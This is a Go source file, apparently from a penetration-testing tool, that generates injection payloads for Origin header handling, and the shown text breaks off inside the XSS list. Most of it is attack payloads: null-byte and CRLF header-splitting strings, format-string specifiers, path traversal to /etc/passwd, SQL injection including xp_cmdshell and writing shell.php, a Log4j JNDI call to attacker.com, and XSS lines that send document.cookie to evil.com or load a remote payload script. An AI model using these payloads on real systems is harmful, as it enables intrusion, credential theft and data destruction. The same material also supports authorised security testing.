package payloads

import (
    "fmt"
    "net/url"
    "strings"
    "time"
)

// NullByteGenerator specializes in null byte and injection-based payloads
type NullByteGenerator struct {
    baseGenerator *Generator
}

// InjectionPayload represents a single injection test payload
type InjectionPayload struct {
    RawPayload       string   // The actual payload to send
    EncodedPayload   string   // URL-encoded version
    Description      string   // What this payload tests
    InjectionType    string   // Classification
    ExpectedBehavior string   // What we expect to happen
    DangerLevel      string   // Severity if successful
    BypassMechanism  string   // How it works
    Variants         []string // Alternative forms
}

// InjectionResult tracks the result of testing an injection payload
type InjectionResult struct {
    Payload          InjectionPayload
    SentOrigin       string
    ReceivedOrigin   string
    StatusCode       int
    ResponseHeaders  map[string]string
    ResponseBody     string
    Successful       bool
    BypassConfirmed  bool
    Notes            string
}

func NewNullByteGenerator() *NullByteGenerator {
    return &NullByteGenerator{
        baseGenerator: NewGenerator(),
    }
}

// GenerateAllInjectionPayloads creates comprehensive injection payload list
func (ng *NullByteGenerator) GenerateAllInjectionPayloads(targetDomain string) []InjectionPayload {
    var payloads []InjectionPayload
    
    // Category 1: Classic Null Byte Injections
    payloads = append(payloads, ng.generateClassicNullBytes(targetDomain)...)
    
    // Category 2: Advanced Null Byte Variations
    payloads = append(payloads, ng.generateAdvancedNullBytes(targetDomain)...)
    
    // Category 3: CRLF Injection Payloads
    payloads = append(payloads, ng.generateCRLFInjections(targetDomain)...)
    
    // Category 4: Line Feed / Carriage Return Injections
    payloads = append(payloads, ng.generateLineTerminatorInjections(targetDomain)...)
    
    // Category 5: Control Character Injections
    payloads = append(payloads, ng.generateControlCharacterInjections(targetDomain)...)
    
    // Category 6: Whitespace Injection Variants
    payloads = append(payloads, ng.generateWhitespaceInjections(targetDomain)...)
    
    // Category 7: Format String Injections
    payloads = append(payloads, ng.generateFormatStringInjections(targetDomain)...)
    
    // Category 8: Path Traversal via Origin
    payloads = append(payloads, ng.generatePathTraversalOrigins(targetDomain)...)
    
    // Category 9: SQL Injection via Origin (if reflected in DB)
    payloads = append(payloads, ng.generateSQLInjectionOrigins(targetDomain)...)
    
    // Category 10: XSS via Origin (if reflected in HTML)
    payloads = append(payloads, ng.generateXSSOrigins(targetDomain)...)
    
    // Category 11: Template Injection Origins
    payloads = append(payloads, ng.generateTemplateInjectionOrigins(targetDomain)...)
    
    // Category 12: Command Injection Origins
    payloads = append(payloads, ng.generateCommandInjectionOrigins(targetDomain)...)
    
    // Category 13: SSRF Preparation Origins
    payloads = append(payloads, ng.generateSSRFPreparationOrigins(targetDomain)...)
    
    // Category 14: Protocol Smuggling Origins
    payloads = append(payloads, ng.generateProtocolSmugglingOrigins(targetDomain)...)
    
    // Category 15: Encoding Chaos (multiple encodings combined)
    payloads = append(payloads, ng.generateEncodingChaosPayloads(targetDomain)...)
    
    return payloads
}

// ============================================================
// CATEGORY 1: CLASSIC NULL BYTE INJECTIONS
// ============================================================

func (ng *NullByteGenerator) generateClassicNullBytes(domain string) []InjectionPayload {
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        {
            RawPayload:       baseEvil + "\x00" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\x00" + domain),
            Description:      "Classic null byte termination after evil domain",
            InjectionType:    "null-byte-classic",
            ExpectedBehavior: "Server strips everything after \\x00, sees only evil.com",
            DangerLevel:      "critical",
            BypassMechanism:  "String termination at C level",
            Variants: []string{
                baseEvil + "%00" + domain,
                baseEvil + "%00",
                "\x00" + baseEvil,
            },
        },
        {
            RawPayload:       baseEvil + "%00" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "%00" + domain),
            Description:      "URL-encoded null byte (%00) between domains",
            InjectionType:    "null-byte-urlencoded",
            ExpectedBehavior: "URL decoder passes null byte through",
            DangerLevel:      "critical",
            BypassMechanism:  "Double decoding or passthrough",
            Variants: []string{
                baseEvil + "%2500" + domain,  // Double encoded
                baseEvil + "\x00",
            },
        },
        {
            RawPayload:       baseEvil + "\x00",
            EncodedPayload:   url.QueryEscape(baseEvil + "\x00"),
            Description:      "Null byte appended to evil domain",
            InjectionType:    "null-byte-append",
            ExpectedBehavior: "Truncation or buffer issues allow evil.com",
            DangerLevel:      "high",
            BypassMechanism:  "String length miscalculation",
            Variants: []string{
                baseEvil + "%00",
                baseEvil + "\x00https://" + domain,
            },
        },
        {
            RawPayload:       "\x00" + baseEvil,
            EncodedPayload:   url.QueryEscape("\x00" + baseEvil),
            Description:      "Null byte prepended to evil domain",
            InjectionType:    "null-byte-prepend",
            ExpectedBehavior: "Some parsers skip leading null bytes",
            DangerLevel:      "medium",
            BypassMechanism:  "Leading byte stripping",
            Variants: []string{
                "%00" + baseEvil,
                "\x00\x00" + baseEvil,
            },
        },
        {
            RawPayload:       "null\x00" + baseEvil,
            EncodedPayload:   url.QueryEscape("null\x00" + baseEvil),
            Description:      "Null byte in 'null' origin value",
            InjectionType:    "null-byte-null-origin",
            ExpectedBehavior: "Transforms 'null' into accepted origin",
            DangerLevel:      "high",
            BypassMechanism:  "Null origin acceptance bypass",
            Variants: []string{
                "null%00" + baseEvil,
                "null\x00",
            },
        },
        {
            RawPayload:       baseEvil + "\x00/ignored-path",
            EncodedPayload:   url.QueryEscape(baseEvil + "\x00/ignored-path"),
            Description:      "Null byte before path component",
            InjectionType:    "null-byte-path-separator",
            ExpectedBehavior: "Path ignored due to null termination",
            DangerLevel:      "high",
            BypassMechanism:  "Path parsing bypass",
            Variants: []string{
                baseEvil + "%00/path",
                baseEvil + "\x00?query=ignored",
            },
        },
    }
}

// ============================================================
// CATEGORY 2: ADVANCED NULL BYTE VARIATIONS
// ============================================================

func (ng *NullByteGenerator) generateAdvancedNullBytes(domain string) []InjectionPayload {
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        // Multiple null bytes
        {
            RawPayload:       baseEvil + "\x00\x00\x00" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\x00\x00\x00" + domain),
            Description:      "Triple null byte sequence",
            InjectionType:    "null-byte-multiple",
            ExpectedBehavior: "Some systems require multiple nulls for termination",
            DangerLevel:      "critical",
            BypassMechanism:  "Multi-null termination requirement",
            Variants: []string{
                baseEvil + "%00%00%00" + domain,
                baseEvil + strings.Repeat("\x00", 10) + domain,
            },
        },
        
        // Null byte with other special chars
        {
            RawPayload:       baseEvil + "\x00@" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\x00@" + domain),
            Description:      "Null byte followed by @ symbol",
            InjectionType:    "null-byte-combo-at",
            ExpectedBehavior: "Combines null termination with auth bypass",
            DangerLevel:      "critical",
            BypassMechanism:  "Hybrid bypass technique",
            Variants: []string{
                baseEvil + "%00%40" + domain,
                baseEvil + "@\x00" + domain,
            },
        },
        
        // Null byte in protocol
        {
            RawPayload:       "https\x00://" + "evil.com",
            EncodedPayload:   url.QueryEscape("https\x00://" + "evil.com"),
            Description:      "Null byte within protocol scheme",
            InjectionType:    "null-byte-protocol",
            ExpectedBehavior: "Protocol parsing corruption",
            DangerLevel:      "high",
            BypassMechanism:  "Scheme validation bypass",
            Variants: []string{
                "http\x00s://evil.com",
                "%68%74%74%70%73%00://evil.com",
            },
        },
        
        // Null byte in TLD
        {
            RawPayload:       "https://evil.com\x00" + domain,
            EncodedPayload:   url.QueryEscape("https://evil.com\x00" + domain),
            Description:      "Null byte after TLD, before trusted domain",
            InjectionType:    "null-byte-tld",
            ExpectedBehavior: "TLD parsing stops at null, appends nothing",
            DangerLevel:      "critical",
            BypassMechanism:  "Domain suffix stripping",
            Variants: []string{
                "https://evil.com%00" + domain,
                "https://evil.com\x00." + domain,
            },
        },
        
        // Wide null (UTF-16)
        {
            RawPayload:       "https://evil.com\u0000" + domain,
            EncodedPayload:   url.QueryEscape("https://evil.com\u0000" + domain),
            Description:      "Wide/UTF-16 null character",
            InjectionType:    "null-byte-wide",
            ExpectedBehavior: "Wide char null in UTF-16 systems",
            DangerLevel:      "medium",
            BypassMechanism:  "Character encoding confusion",
            Variants: []string{
                "https://evil.com%FE%FF%00%00" + domain,
                "https://evil.com\uFFFD" + domain,  // Replacement char
            },
        },
        
        // Null byte alternative: NULL equivalent bytes
        {
            RawPayload:       baseEvil + "\x00",
            EncodedPayload:   url.QueryEscape(baseEvil + "\x00"),
            Description:      "Zero byte (ASCII NULL)",
            InjectionType:    "null-alternative-zero",
            ExpectedBehavior: "Standard null byte behavior",
            DangerLevel:      "high",
            BypassMechanism:  "Direct null injection",
            Variants: []string{
                baseEvil + "%00",
                baseEvil + "\x00",
                baseEvil + "%c0%80",  // Overlong UTF-8 null
            },
        },
        
        // Overlong UTF-8 encoding of null
        {
            RawPayload:       baseEvil + "%c0%80" + domain,
            EncodedPayload:   baseEvil + "%c0%80" + domain,
            Description:      "Overlong UTF-8 encoding (2-byte null)",
            InjectionType:    "null-overlong-utf8",
            ExpectedBehavior: "Non-shortest form decoded as null",
            DangerLevel:      "critical",
            BypassMechanism:  "UTF-8 validation bypass",
            Variants: []string{
                baseEvil + "%e0%80%80" + domain,  // 3-byte overlong
                baseEvil + "%f0%80%80%80" + domain, // 4-byte overlong
            },
        },
        
        // Null in IP address
        {
            RawPayload:       "https://127.0.0.1\x00.evil.com",
            EncodedPayload:   url.QueryEscape("https://127.0.0.1\x00.evil.com"),
            Description:      "Null byte in IP address (local -> evil)",
            InjectionType:    "null-byte-ip",
            ExpectedBehavior: "IP appears local, resolves to evil",
            DangerLevel:      "critical",
            BypassMechanism:  "IP validation bypass",
            Variants: []string{
                "https://0.0.0.0\x00.evil.com",
                "https://localhost\x00.evil.com",
            },
        },
    }
}

// ============================================================
// CATEGORY 3: CRLF INJECTION PAYLOADS
// ============================================================

func (ng *NullByteGenerator) generateCRLFInjections(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        // Basic CRLF
        {
            RawPayload:       baseEvil + "\r\nX-Injected: true",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nX-Injected: true"),
            Description:      "Basic CRLF injection (carriage return + line feed)",
            InjectionType:    "crlf-basic",
            ExpectedBehavior: "Header split: injects X-Injected header",
            DangerLevel:      "critical",
            BypassMechanism:  "HTTP header parsing vulnerability",
            Variants: []string{
                baseEvil + "%0d%0aX-Injected: true",
                baseEvil + "\r\n" + "X-Injected: true",
            },
        },
        
        // CRLF with Set-Cookie injection
        {
            RawPayload:       baseEvil + "\r\nSet-Cookie: session=hacked",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nSet-Cookie: session=hacked"),
            Description:      "CRLF injecting Set-Cookie header (cookie overwrite)",
            InjectionType:    "crlf-cookie",
            ExpectedBehavior: "Attacker can set arbitrary cookies",
            DangerLevel:      "critical",
            BypassMechanism:  "Cookie injection via header splitting",
            Variants: []string{
                baseEvil + "%0d%0aSet-Cookie: session=hacked",
                baseEvil + "\r\n" + "Set-Cookie: admin=true",
            },
        },
        
        // CRLF with Access-Control-Allow-Origin override
        {
            RawPayload:       "anything\r\nAccess-Control-Allow-Origin: *",
            EncodedPayload:   url.QueryEscape("anything\r\nAccess-Control-Allow-Origin: *"),
            Description:      "CRLF to override ACAO header entirely",
            InjectionType:    "crlf-acao-override",
            ExpectedBehavior: "Sets wildcard origin via header injection",
            DangerLevel:      "critical",
            BypassMechanism:  "CORS header injection",
            Variants: []string{
                "x\r\nAccess-Control-Allow-Origin: https://evil.com",
                "a\r\nAccess-Control-Allow-Origin: https://evil.com\r\nAccess-Control-Allow-Credentials: true",
            },
        },
        
        // CRLF with Access-Control-Allow-Credentials
        {
            RawPayload:       baseEvil + "\r\nAccess-Control-Allow-Credentials: true",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nAccess-Control-Allow-Credentials: true"),
            Description:      "CRLF enabling credentials on untrusted origin",
            InjectionType:    "crlf-credentials",
            ExpectedBehavior: "Enables credential sharing cross-origin",
            DangerLevel:      "critical",
            BypassMechanism:  "Credential header injection",
            Variants: []string{
                baseEvil + "%0d%0aAccess-Control-Allow-Credentials: true",
                baseEvil + "\r\nACAC: true",
            },
        },
        
        // CRLF with Location redirect
        {
            RawPayload:       baseEvil + "\r\nLocation: https://evil.com/phishing",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nLocation: https://evil.com/phishing"),
            Description:      "CRLF injecting Location header (open redirect)",
            InjectionType:    "crlf-redirect",
            ExpectedBehavior: "Redirects victim to attacker site",
            DangerLevel:      "critical",
            BypassMechanism:  "Open redirect via header injection",
            Variants: []string{
                baseEvil + "%0d%0aLocation: https://evil.com",
                baseEvil + "\r\n" + "Location: javascript:alert(1)",
            },
        },
        
        // CRLF with Content-Type override
        {
            RawPayload:       baseEvil + "\r\nContent-Type: text/html",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nContent-Type: text/html"),
            Description:      "CRLF changing Content-Type (potential XSS)",
            InjectionType:    "crlf-content-type",
            ExpectedBehavior: "Response interpreted as HTML",
            DangerLevel:      "critical",
            BypassMechanism:  "Content-Type confusion",
            Variants: []string{
                baseEvil + "%0d%0aContent-Type: text/html",
                baseEvil + "\r\nContent-Type: text/html\r\nX-XSS-Protection: 0",
            },
        },
        
        // Double CRLF (body injection)
        {
            RawPayload:       baseEvil + "\r\n\r\n<script>alert(1)</script>",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\n\r\n<script>alert(1)</script>"),
            Description:      "Double CRLF to inject response body (XSS)",
            InjectionType:    "crlf-body-injection",
            ExpectedBehavior: "Injects content into HTTP body",
            DangerLevel:      "critical",
            BypassMechanism:  "HTTP response splitting",
            Variants: []string{
                baseEvil + "%0d%0a%0d%0a<script>alert(document.cookie)</script>",
                baseEvil + "\r\n\r\n" + "<html><body><h1>Pwned</h1></body></html>",
            },
        },
        
        // CRLF with X-Forwarded-Host
        {
            RawPayload:       baseEvil + "\r\nX-Forwarded-Host: evil.com",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\nX-Forwarded-Host: evil.com"),
            Description:      "CRLF setting X-Forwarded-Host (cache poisoning)",
            InjectionType:    "crlf-forwarded-host",
            ExpectedBehavior: "Server thinks request came from evil.com",
            DangerLevel:      "critical",
            BypassMechanism:  "Host header confusion via CRLF",
            Variants: []string{
                baseEvil + "%0d%0aX-Forwarded-Host: evil.com",
                baseEvil + "\r\nX-Forwarded-Server: evil.com",
            },
        },
        
        // LF only (without CR)
        {
            RawPayload:       baseEvil + "\nX-Injected: lf-only",
            EncodedPayload:   url.QueryEscape(baseEvil + "\nX-Injected: lf-only"),
            Description:      "Line Feed only (some systems accept without CR)",
            InjectionType:    "lf-only",
            ExpectedBehavior: "LF alone may split headers on some servers",
            DangerLevel:      "high",
            BypassMechanism:  "Lenient header parsing",
            Variants: []string{
                baseEvil + "%0aX-Injected: lf-only",
                baseEvil + "\n" + "X-Test: newline",
            },
        },
        
        // CR only (without LF)
        {
            RawPayload:       baseEvil + "\rX-Injected: cr-only",
            EncodedPayload:   url.QueryEscape(baseEvil + "\rX-Injected: cr-only"),
            Description:      "Carriage Return only injection attempt",
            InjectionType:    "cr-only",
            ExpectedBehavior: "CR alone may work on some platforms",
            DangerLevel:      "medium",
            BypassMechanism:  "CR-based line ending",
            Variants: []string{
                baseEvil + "%0dX-Injected: cr-only",
            },
        },
        
        // Encoded CRLF (%0d%0a)
        {
            RawPayload:       baseEvil + "%0d%0aX-Encoded: true",
            EncodedPayload:   baseEvil + "%0d%0aX-Encoded: true",
            Description:      "URL-encoded CRLF sequence",
            InjectionType:    "crlf-urlencoded",
            ExpectedBehavior: "If double-decoded, becomes real CRLF",
            DangerLevel:      "high",
            BypassMechanism:  "Encoding bypass chain",
            Variants: []string{
                baseEvil + "%250d%250aX-Encoded: true",  // Double encoded
                baseEvil + "%0D%0AX-Upper: true",  // Uppercase
            },
        },
        
        // Unicode line separators
        {
            RawPayload:       baseEvil + "\u2028X-Unicode: sep",
            EncodedPayload:   url.QueryEscape(baseEvil + "\u2028X-Unicode: sep"),
            Description:      "Unicode Line Separator (U+2028)",
            InjectionType:    "unicode-line-sep",
            ExpectedBehavior: "May be treated as line break in some contexts",
            DangerLevel:      "medium",
            BypassMechanism:  "Unicode normalization",
            Variants: []string{
                baseEvil + "%E2%80%A8X-LS: test",  // UTF-8 encoded
                baseEvil + "\u2029X-PS: test",  // Paragraph separator
            },
        },
    }
}

// ============================================================
// CATEGORY 4: LINE TERMINATOR VARIATIONS
// ============================================================

func (ng *NullByteGenerator) generateLineTerminatorInjections(domain string) []InjectionPayload {
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        // Various newline representations
        {
            RawPayload:       baseEvil + "\n",
            EncodedPayload:   url.QueryEscape(baseEvil + "\n"),
            Description:      "Newline character (LF)",
            InjectionType:    "line-feed",
            ExpectedBehavior: "Line break in header value",
            DangerLevel:      "high",
            BypassMechanism:  "Newline injection",
            Variants: []string{baseEvil + "%0a", baseEvil + "%0a%0a"},
        },
        {
            RawPayload:       baseEvil + "\r",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r"),
            Description:      "Carriage Return character",
            InjectionType:    "carriage-return",
            ExpectedBehavior: "Carriage return in header value",
            DangerLevel:      "medium",
            BypassMechanism:  "CR injection",
            Variants: []string{baseEvil + "%0d"},
        },
        {
            RawPayload:       baseEvil + "\r\n",
            EncodedPayload:   url.QueryEscape(baseEvil + "\r\n"),
            Description:      "Standard CRLF sequence",
            InjectionType:    "crlf-standard",
            ExpectedBehavior: "Complete line terminator",
            DangerLevel:      "critical",
            BypassMechanism:  "HTTP line ending",
            Variants: []string{baseEvil + "%0d%0a"},
        },
        {
            RawPayload:       baseEvil + "\n\r",
            EncodedPayload:   url.QueryEscape(baseEvil + "\n\r"),
            Description:      "Reversed LFCR sequence",
            InjectionType:    "lfcr-reversed",
            ExpectedBehavior: "Non-standard line ending may confuse parsers",
            DangerLevel:      "medium",
            BypassMechanism:  "Reversed terminator",
            Variants: []string{baseEvil + "%0a%0d"},
        },
        // Form feed
        {
            RawPayload:       baseEvil + "\f" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\f" + domain),
            Description:      "Form Feed character injection",
            InjectionType:    "form-feed",
            ExpectedBehavior: "Form feed may clear buffers or cause issues",
            DangerLevel:      "medium",
            BypassMechanism:  "Form feed side effects",
            Variants: []string{baseEvil + "%0c" + domain},
        },
        // Vertical tab
        {
            RawPayload:       baseEvil + "\v" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\v" + domain),
            Description:      "Vertical Tab character",
            InjectionType:    "vertical-tab",
            ExpectedBehavior: "Vertical tab may affect formatting/parsing",
            DangerLevel:      "low",
            BypassMechanism:  "VT injection",
            Variants: []string{baseEvil + "%0b" + domain},
        },
    }
}

// ============================================================
// CATEGORY 5: CONTROL CHARACTER INJECTIONS
// ============================================================

func (ng *NullByteGenerator) generateControlCharacterInjections(domain string) []InjectionPayload {
    baseEvil := "https://evil.com"
    
    controlChars := []struct {
        char      rune
        name      string
        hex       string
        desc      string
        danger    string
    }{
        {'\x00', "NULL", "00", "Null terminator", "critical"},
        {'\x01', "SOH (Start of Heading)", "01", "Start of heading", "medium"},
        {'\x02', "STX (Start of Text)", "02", "Start of text", "medium"},
        {'\x03', "ETX (End of Text)", "03", "End of text (Ctrl+C)", "medium"},
        {'\x04', "EOT (End of Transmission)", "04", "End of transmission", "medium"},
        {'\x05', "ENQ (Enquiry)", "05", "Enquiry character", "low"},
        {'\x06', "ACK (Acknowledge)", "06", "Acknowledge", "low"},
        {'\x07', "BEL (Bell)", "07", "Bell/alert character", "low"},
        {'\x08', "BS (Backspace)", "08", "Backspace character", "high"},
        {'\x09', "HT (Horizontal Tab)", "09", "Tab character", "medium"},
        {'\x0a', "LF (Line Feed)", "0a", "Newline", "high"},
        {'\x0b', "VT (Vertical Tab)", "0b", "Vertical tab", "low"},
        {'\x0c', "FF (Form Feed)", "0c", "Form feed", "medium"},
        {'\x0d', "CR (Carriage Return)", "0d", "Carriage return", "high"},
        {'\x0e', "SO (Shift Out)", "0e", "Shift out (alternate charset)", "medium"},
        {'\x0f', "SI (Shift In)", "0f", "Shift in (resume normal)", "medium"},
        {'\x1b', "ESC (Escape)", "1b", "Escape character", "high"},
        {'\x7f', "DEL (Delete)", "7f", "Delete character", "medium"},
    }
    
    var payloads []InjectionPayload
    
    for _, cc := range controlChars {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       baseEvil + string(cc.char) + domain,
            EncodedPayload:   fmt.Sprintf("%s%%%s%s", baseEvil, cc.hex, domain),
            Description:      fmt.Sprintf("%s (%s) injection in origin", cc.name, cc.hex),
            InjectionType:    fmt.Sprintf("control-char-%s", strings.ToLower(cc.name)),
            ExpectedBehavior: fmt.Sprintf("Control char %s causes unexpected behavior", cc.name),
            DangerLevel:      cc.danger,
            BypassMechanism:  "Control character processing difference",
            Variants: []string{
                fmt.Sprintf("%s%%%.2x%s", baseEvil, cc.char, domain),
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 6: WHITESPACE INJECTION VARIANTS
// ============================================================

func (ng *NullByteGenerator) generateWhitespaceInjections(domain string) []InjectionPayload {
    baseEvil := "https://evil.com"
    
    return []InjectionPayload{
        // Space padding
        {
            RawPayload:       " " + baseEvil + " ",
            EncodedPayload:   url.QueryEscape(" " + baseEvil + " "),
            Description:      "Space padded origin (leading and trailing)",
            InjectionType:    "whitespace-space",
            ExpectedBehavior: "Spaces stripped during validation",
            DangerLevel:      "medium",
            BypassMechanism:  "Whitespace trimming bypass",
            Variants: []string{
                " " + baseEvil,
                baseEvil + " ",
                strings.Repeat(" ", 20) + baseEvil,
            },
        },
        
        // Tab injection
        {
            RawPayload:       baseEvil + "\t" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\t" + domain),
            Description:      "Tab character between domains",
            InjectionType:    "whitespace-tab",
            ExpectedBehavior: "Tab treated as separator or ignored",
            DangerLevel:      "high",
            BypassMechanism:  "Tab-as-delimiter",
            Variants: []string{
                baseEvil + "%09" + domain,
                "\t" + baseEvil,
                baseEvil + strings.Repeat("\t", 5),
            },
        },
        
        // Multiple spaces (potential regex bypass)
        {
            RawPayload:       baseEvil + strings.Repeat(" ", 100) + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + strings.Repeat(" ", 100) + domain),
            Description:      "100 spaces (regex ReDoS potential)",
            InjectionType:    "whitespace-flood",
            ExpectedBehavior: "May cause timeout or regex failure",
            DangerLevel:      "medium",
            BypassMechanism:  "Denial of service / validation skip",
            Variants: []string{
                baseEvil + strings.Repeat(" ", 1000) + domain,
            },
        },
        
        // Non-breaking space
        {
            RawPayload:       baseEvil + "\u00a0" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\u00a0" + domain),
            Description:      "Non-breaking space (U+00A0)",
            InjectionType:    "whitespace-nbsp",
            ExpectedBehavior: "NBSP not treated as regular space",
            DangerLevel:      "medium",
            BypassMechanism:  "Space-like char not normalized",
            Variants: []string{
                baseEvil + "%c2%a0" + domain,  // UTF-8 NBSP
                baseEvil + "&nbsp;" + domain,  // HTML entity
            },
        },
        
        // Zero-width space
        {
            RawPayload:       baseEvil + "\u200b" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + "\u200b" + domain),
            Description:      "Zero-width space (invisible separator)",
            InjectionType:    "whitespace-zwsp",
            ExpectedBehavior: "Invisible char bypasses visual checks",
            DangerLevel:      "high",
            BypassMechanism:  "Zero-width character invisibility",
            Variants: []string{
                baseEvil + "%E2%80%8b" + domain,  // UTF-8 ZWSP
                baseEvil + "\u200c" + domain,  // Zero-width non-joiner
                baseEvil + "\u200d" + domain,  // Zero-width joiner
            },
        },
        
        // Various whitespace chars combo
        {
            RawPayload:       baseEvil + " \t\n\r" + domain,
            EncodedPayload:   url.QueryEscape(baseEvil + " \t\n\r" + domain),
            Description:      "Mixed whitespace characters",
            InjectionType:    "whitespace-mixed",
            ExpectedBehavior: "Different whitespace handling per parser",
            DangerLevel:      "high",
            BypassMechanism:  "Whitespace normalization diff",
            Variants: []string{
                baseEvil + "%20%09%0a%0d" + domain,
            },
        },
    }
}

// ============================================================
// CATEGORY 7: FORMAT STRING INJECTIONS
// ============================================================

func (ng *NullByteGenerator) generateFormatStringInjections(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    formatSpecifiers := []string{
        "%s", "%n", "%x", "%p", "%d", "%i", "%u", "%f", "%e", "%g",
        "%08x", "%.1024d", "%1000$hn",
        "%s%s%s%s%s%s%s%s%s%s",
        "%n%n%n%n%n",
        "\x08%x",  // Address + format
        "AAAA%08x.%08x.%08x.%08x.%08x",
        "%p%p%p%p%p%p%p%p%p%p",
    }
    
    var payloads []InjectionPayload
    
    for i, spec := range formatSpecifiers {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       baseEvil + spec,
            EncodedPayload:   url.QueryEscape(baseEvil + spec),
            Description:      fmt.Sprintf("Format string specifier #%d: %s", i+1, truncate(spec, 20)),
            InjectionType:    "format-string",
            ExpectedBehavior: "If origin used in printf-like call, memory read/write",
            DangerLevel: func() string {
                if spec == "%n" || strings.Contains(spec, "$hn") {
                    return "critical"
                }
                return "high"
            }(),
            BypassMechanism:  "Unsanitized format string in logging/validation",
            Variants: []string{
                spec + baseEvil,
                baseEvil + url.PathEscape(spec),
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 8: PATH TRAVERSAL VIA ORIGIN
// ============================================================

func (ng *NullByteGenerator) generatePathTraversalOrigins(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    traversals := []string{
        "../",
        "..\\",
        ".../",
        "..../",
        "./",
        ".\\./",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e\\",
        "..%5c",
        "%252e%252e%255c",  // Double encoded
        "..\\..\\..\\",
        "....//....//",
        "/..../",
    }
    
    var payloads []InjectionPayload
    
    for _, trav := range traversals {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       baseEvil + "/" + trav + "etc/passwd",
            EncodedPayload:   url.QueryEscape(baseEvil + "/" + trav + "etc/passwd"),
            Description:      fmt.Sprintf("Path traversal: %s", truncate(trav, 20)),
            InjectionType:    "path-traversal",
            ExpectedBehavior: "If origin concatenated to filesystem path",
            DangerLevel:      "critical",
            BypassMechanism:  "Directory traversal via origin header",
            Variants: []string{
                baseEvil + trav + "windows/system32/config/sam",
                baseEvil + "/" + trav + ".git/config",
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 9: SQL INJECTION VIA ORIGIN
// ============================================================

func (ng *NullByteGenerator) generateSQLInjectionOrigins(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    sqliPayloads := []struct {
        payload string
        desc    string
        dbms    string
    }{
        {"' OR '1'='1", "Basic auth bypass", "Generic"},
        {"' UNION SELECT * FROM users--", "Union injection", "MySQL"},
        {"'; DROP TABLE users;--", "Table deletion", "Generic"},
        {"' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--", "Data exfil MSSQL", "MSSQL"},
        {"' || (SELECT TOP 1 password FROM users)--", "Oracle concat", "Oracle"},
        {"'; EXEC xp_cmdshell('whoami')--", "Command exec MSSQL", "MSSQL"},
        {"${jndi:ldap://attacker.com/a}", "Log4j injection", "Log4j"},
        {"`", "Backtick execution", "MySQL"},
        {"1; WAITFOR DELAY '0:0:5'--", "Time-based blind", "MSSQL"},
        {"' AND SLEEP(5)--", "Time-based MySQL", "MySQL"},
        {"' AND pg_sleep(5)--", "Time-based PostgreSQL", "PostgreSQL"},
        {"'; COPY users TO '/tmp/dump.csv';--", "Postgres file write", "PostgreSQL"},
        {"' UNION LOAD_FILE('/etc/passwd')--", "File read MySQL", "MySQL"},
        {"' INTO OUTFILE '/var/www/shell.php'--", "File write MySQL", "MySQL"},
    }
    
    var payloads []InjectionPayload
    
    for _, sqli := range sqliPayloads {
        payloads = append(payloads, InjectionPayload{
            RawPayload:       baseEvil + sqli.payload,
            EncodedPayload:   url.QueryEscape(baseEvil + sqli.payload),
            Description:      fmt.Sprintf("SQLi [%s]: %s", sqli.dbms, truncate(sqli.desc, 30)),
            InjectionType:    "sql-injection",
            ExpectedBehavior: "If origin stored/used in SQL query unsanitized",
            DangerLevel:      "critical",
            BypassMechanism:  "SQL injection via Origin header",
            Variants: []string{
                sqli.payload + baseEvil,
                url.PathEscape(sqli.payload) + baseEvil,
            },
        })
    }
    
    return payloads
}

// ============================================================
// CATEGORY 10: XSS VIA ORIGIN (REFLECTION)
// ============================================================

func (ng *NullByteGenerator) generateXSSOrigins(domain string) []InjectionPayload {
	_ = domain
    baseEvil := "https://evil.com"
    
    xssPayloads := []string{
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<form><button formaction=javascript:alert(1)>click</button></form>",
        "'-alert(1)-'",
        "</script><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "><script>alert(document.domain)</script>",
        "<script>fetch('https://evil.com?c='+document.cookie)</script>",
        "<script>new Image().src='https://evil.com/?'+document.cookie</script>",
        "<script>location='https://evil.com/?c='+document.cookie</script>",
        "<svg/onload=eval(`fetch('//evil.com/?c=${document.cookie}`))>",
        "<script/src=https://evil.com/payload.js></script>",
        "<base href=//evil.com/><script>alert(1)</script>",
        "<object data=javascript:alert(1)>",
